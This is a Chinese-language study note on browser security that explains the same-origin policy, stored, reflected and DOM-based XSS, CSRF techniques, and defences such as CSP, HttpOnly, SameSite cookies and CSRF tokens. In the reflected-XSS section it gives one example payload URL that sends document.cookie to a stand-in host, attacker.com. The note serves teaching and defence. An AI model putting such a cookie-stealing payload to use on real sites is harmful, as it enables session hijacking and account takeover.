# 浏览器安全

## 同源策略

如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。

```js
http://store.company.com/dir/page.html

http://store.company.com/dir2/other.html // 同源，路径不同
https://store.company.com/secure.html // 不同源，协议不同
http://news.company.com/dir/other.html  // 不同源，域名不同
http://store.company.com:81/dir/etc.html // 不同源，端口不同
```

同源体现在三个方面

* DOM 层面。只有同源的页面才能通过 window.opener 拿到上一个页面的 window 对象去修改 dom
* 数据层面。Cookie、IndexDB、LocalStorage 这些数据在同源的页面下才能访问
* 网络层面。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。

## 跨站脚本攻击（XSS）

XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。

### XSS 可以做什么

* 可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
* 可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。
* 可以通过修改 DOM 伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。
* 还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。

### XSS 如何注入

* 存储型 XSS 攻击

首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；然后用户向网站请求包含了恶意 JavaScript 脚本的页面；当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。

例如，2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一个引入了外部 js 代码的 script 标签。喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行，这样就可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器。黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号，并利用用户账号进行一些恶意操作。

* 反射型 XSS 攻击

用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接。Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方。

例如，某个网站的错误页面是简单获取 url 参数中的 msg 参数然后插入错误页面中显示。那么黑客就可以诱使用户点击一个联机：`https//somesite.com/error.html?msg=<script>var+i=newImage;i.src="http://attacker.com"%2bdocument.cookie;</script>`。这样用户点击后后面的恶意代码就会执行，会生成一个图片，然后请求黑客的网址将 cookie 上传至黑客的服务器。

* 基于 DOM 的 XSS 攻击

基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。

### 如何阻止 XSS

1. 服务器对输入脚本进行过滤或转码。将请求提交内容中的 js 代码过滤掉，可以进行转义。
2. CSP（Content-Security-Policy 内容安全策略）。
    * 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
    * 禁止向第三方域提交数据，这样用户数据也不会外泄；
    * 禁止执行内联脚本和未授权的脚本；
    * 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。
3. 使用 HttpOnly 属性。HttpOnly 是服务器通过 HTTP 响应头来设置的。set-cookie 属性值最后使用 HttpOnly 来标记该 Cookie。使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。

## CSRF

CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。

### CSRF 攻击方式

1. 自动发起 Get 请求。假设网站有一个转账的接口，打开黑客的链接后，将请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的钱就被转移到黑客的账户上去了。
2. 自动发起 POST 请求。黑客在页面中创建一个隐藏的表单，用户打开黑客链接后，隐藏的表单会自动执行提交执行转账操作。
3. 引诱用户点击链接。链接的地址其实是调用转账接口，点击后就会执行转账操作。

和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。

### 为什么黑客的网站和要攻击的网站不同域，请求也可以获取到 cookie？

虽然黑客网站和目标网站域名不同，是跨域的，但是 img 标签的 src 可以加载不同域名的数据发起 get 请求，并携带对应域名的 cookie，而表单一般用于提交数据，可以跨域发请求，只是拿不到响应而已，所以浏览器不限制利用表单发送跨域请求。在不同域名页面下使用 img 和 表单请求携带的 cookie 被称为第三方 cookie。

### 如何防止 CSRF

1. 充分利用好 Cookie 的 SameSite 属性。在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项。SameSite 选项通常有 Strict、Lax 和 None 三个值。
    * Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。
    * Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。
    * 而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。
2. 验证请求的来源站点。Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 Origin 属性，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性。Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。
3. CSRF Token。
    1. 第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。
    2. 第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。